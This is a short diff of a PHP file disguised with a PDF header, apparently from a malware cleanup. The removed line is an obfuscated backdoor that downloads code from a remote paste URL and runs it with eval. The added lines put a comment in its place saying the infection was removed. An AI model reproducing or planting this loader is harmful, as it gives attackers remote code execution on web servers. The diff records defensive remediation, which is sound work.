@@ -1,2 +1,7 @@
 #%PDF-
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(urldecode(urlencode(rawurldecode(rawurlencode("https://paste.phyo186.cfd/c9Zt7-JVIzo/raw"))))));/**/?>
+<?
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+/**/?>
